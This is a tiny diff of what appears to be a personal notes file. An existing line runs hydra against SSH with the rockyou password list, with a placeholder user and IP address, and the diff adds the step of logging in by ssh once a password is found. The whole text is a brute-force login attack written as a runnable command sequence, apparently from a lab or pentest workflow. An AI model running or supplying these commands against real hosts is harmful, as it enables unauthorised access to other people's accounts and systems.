@@ -1,1 +1,5 @@
 hydra -l "target_user" -P /usr/share/wordlists/rockyou.txt -t 4 ssh:"target_ip_address"
+
+once password found
+
+ssh "target_user"@"target_ip_address"
